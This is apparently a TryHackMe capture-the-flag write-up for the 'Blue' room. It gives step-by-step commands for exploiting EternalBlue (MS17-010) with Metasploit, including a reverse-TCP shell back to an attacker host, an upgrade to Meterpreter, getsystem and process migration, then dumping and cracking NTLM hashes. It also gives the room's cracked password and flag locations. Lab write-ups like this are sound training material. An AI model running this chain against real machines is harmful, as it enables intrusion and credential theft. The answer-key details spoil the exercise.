# Blue – TryHackMe Writeup

## Objective
Exploit a vulnerable Windows machine affected by MS17-010 (EternalBlue), gain SYSTEM access, dump password hashes, and retrieve flags.

---

# Reconnaissance

## Full Scan
```bash
nmap -sV -vv --script vuln <target-ip>
nmap -sC -sV -p- <target-ip>
```

### Finding
The target is vulnerable to:

```
MS17-010 (EternalBlue)
```

A critical Remote Code Execution vulnerability in SMBv1.

---

# Initial Access – EternalBlue Exploit

## Start Metasploit
```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
```

## Configure exploit
```bash
set RHOSTS <target-ip>
set payload windows/x64/shell/reverse_tcp
run
```

Reverse shell obtained.

Background the shell:
```
Ctrl + Z
```

---

# Upgrade Shell to Meterpreter

```bash
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST <attacker-ip>
run
```

List sessions:
```bash
sessions
sessions -i 2
```

---

# Privilege Escalation

## Attempt automatic SYSTEM access
```bash
getsystem
```

Confirm:
```bash
shell
whoami
```

Should show:
```
NT AUTHORITY\SYSTEM
```

Background shell:
```
Ctrl + Z
```

---

## Process Migration

List processes:
```bash
ps
```

Find a process running as:
```
NT AUTHORITY\SYSTEM
```

Migrate:
```bash
migrate <process-id>
```

Ensures stable SYSTEM-level session.

---

# Dump Password Hashes

```bash
hashdump
```

Identified user:
```
Jon
```

Save NT hash:
```bash
echo <NT-hash> > nt.txt
```

Crack with John:
```bash
john --format=NT nt.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered credentials:
```
Jon : alqfna22
```

---

# Flag Collection

## Flag 1
```bash
cd C:\
type flag1.txt
```

---

## Flag 2
```bash
cd C:\Windows\System32\config
type flag2.txt
```

---

## Flag 3
```bash
cd C:\Users\Jon\Documents
type flag3.txt
```

---

# Attack Flow Summary

1. Nmap vulnerability scan  
2. Identified MS17-010  
3. Exploited EternalBlue  
4. Upgraded shell to Meterpreter  
5. Obtained SYSTEM privileges  
6. Dumped NTLM hashes  
7. Cracked password  
8. Retrieved flags  

---

# Techniques Practiced

- SMB exploitation  
- EternalBlue (MS17-010)  
- Shell upgrading  
- Meterpreter usage  
- Windows privilege escalation  
- Hash dumping  
- NTLM cracking  

---

# Tools Used

- Nmap  
- Metasploit  
- John the Ripper  
- Windows SMB exploitation  

---

✅ Room completed successfully
